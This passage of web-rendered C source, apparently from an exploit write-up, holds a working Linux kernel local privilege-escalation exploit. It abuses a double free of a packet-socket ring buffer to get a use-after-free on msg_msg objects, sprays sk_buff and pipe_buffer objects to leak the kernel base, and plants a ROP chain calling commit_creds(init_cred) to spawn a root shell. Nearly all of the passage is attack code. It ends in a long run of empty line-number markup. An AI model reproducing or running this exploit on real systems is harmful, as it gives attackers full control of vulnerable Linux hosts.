class="line"></span><br><span class="line">    <span class="keyword">int</span> version = TPACKET_V3;</span><br><span class="line">    <span class="keyword">int</span> ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req3.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">    req3.tp_block_nr = block_nr;</span><br><span class="line">    req3.tp_block_size = block_size;</span><br><span class="line">    req3.tp_frame_size = frame_size;</span><br><span class="line">    req3.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">    req3.tp_retire_blk_tov = timeout;</span><br><span class="line">    req3.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line">	ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req3, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		err_exit(<span class="string">&quot;[-] setsockopt (PACKET_RX_RING)&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_free_first</span><span class="params">(<span class="keyword">int</span> socket_fd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req3</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req3, <span class="number">0</span>, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	req3.tp_sizeof_priv = <span class="number">0</span>;</span><br><span class="line">	req3.tp_block_nr = <span class="number">0</span>;</span><br><span class="line">	req3.tp_block_size = <span class="number">0</span>;</span><br><span class="line">	req3.tp_frame_size = <span class="number">0</span>;</span><br><span class="line">	req3.tp_frame_nr = <span class="number">0</span>;</span><br><span class="line">	req3.tp_retire_blk_tov = <span class="number">0</span>;</span><br><span class="line">	req3.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req3, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		err_exit(<span class="string">&quot;[-] setsockopt (PACKET_RX_RING)&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_free_second</span><span class="params">(<span class="keyword">int</span> socket_fd)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req3</span>;</span></span><br><span class="line">    <span class="keyword">int</span> version = TPACKET_V2;</span><br><span class="line">    <span class="keyword">int</span> ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;req3, <span class="number">0</span>, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req3.tp_sizeof_priv = <span class="number">0</span>;</span><br><span class="line">	req3.tp_block_nr = <span class="number">0</span>;</span><br><span class="line">	req3.tp_block_size = <span class="number">0</span>;</span><br><span class="line">	req3.tp_frame_size = <span class="number">0</span>;</span><br><span class="line">	req3.tp_frame_nr = <span class="number">0</span>;</span><br><span class="line">	req3.tp_retire_blk_tov = <span class="number">0</span>;</span><br><span class="line">	req3.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line">	ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req3, <span class="keyword">sizeof</span>(req3));</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		err_exit(<span class="string">&quot;[-] setsockopt (PACKET_RX_RING)&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">int</span> packet_fds[PG_NUM];</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> socket_fd;</span><br><span class="line">    <span class="keyword">uint64_t</span> victim_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> victim_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span>* <span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> *rop_chain;</span><br><span class="line">    <span class="keyword">int</span> rop_idx;</span><br><span class="line">    save_status();</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    socket_fd = do_alloc_pg_vec(PAGE_SIZE, <span class="number">0x800</span>, <span class="number">0x400</span>/<span class="number">8</span>, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (write_msg(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (write_msg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1024</span>)&#123;</span><br><span class="line">            do_free_first(socket_fd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    do_free_second(socket_fd);</span><br><span class="line"></span><br><span class="line">    init_socket_array(sk_sockets);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    build_msg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (peek_msg(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] victim qid: %d\n&quot;</span>, i);</span><br><span class="line">            victim_qid = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to make the UAF in msg queue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (free_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    build_msg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (peek_msg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE+<span class="number">0x10</span>] != MSG_TAG)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg*)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE+<span class="number">0x10</span>) - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m0x%lx\n&quot;</span>, nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (free_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    build_msg((struct msg_msg *)fake_secondary_msg, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, *(<span class="keyword">uint64_t</span>*)<span class="string">&quot;yhellow&quot;</span>, VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peek_msg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg*) &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m0x%lx\n&quot;</span>, nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m0x%lx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (free_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    build_msg((struct msg_msg *)fake_secondary_msg, victim_addr, victim_addr, VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read_msg(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;yhellow&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *) &amp;fake_secondary_msg; </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg, </span><br><span class="line">                    <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                err_exit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)&#123;</span><br><span class="line">                print_hex(pipe_buf_ptr,<span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%p\n&quot;</span>, pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = (<span class="keyword">uint64_t</span>)pipe_buf_ptr-&gt;ops - <span class="number">0xffffffff8223d800</span>;</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">                <span class="built_in">memcpy</span>(&amp;secondary_msg,&amp;fake_secondary_msg,<span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m0x%lx \033[32m\033[1moffset: \033[0m0x%lx\n&quot;</span>, kernel_base, kernel_offset);</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (struct pipe_buf_operations *) &amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = <span class="number">0xffffffff8130245e</span> + kernel_offset; <span class="comment">// PUSH_RSI_POP_RSP_POP_4VAL_RET</span></span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + <span class="number">0xffffffff8100f530</span>; <span class="comment">// pop_rdi_ret</span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + <span class="number">0xffffffff82889040</span>; <span class="comment">// INIT_CRED</span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + <span class="number">0xffffffff810df150</span>; <span class="comment">// COMMIT_CREDS</span></span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + <span class="number">0xffffffff81e00fb0</span>+<span class="number">22</span>; <span class="comment">// SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;</span></span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;yhellow&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = get_root_shell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (spray_sk_buff(sk_sockets, fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for gdb attach only</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gadget: %p\n&quot;</span>, kernel_offset + <span class="number">0xffffffff8130245e</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span 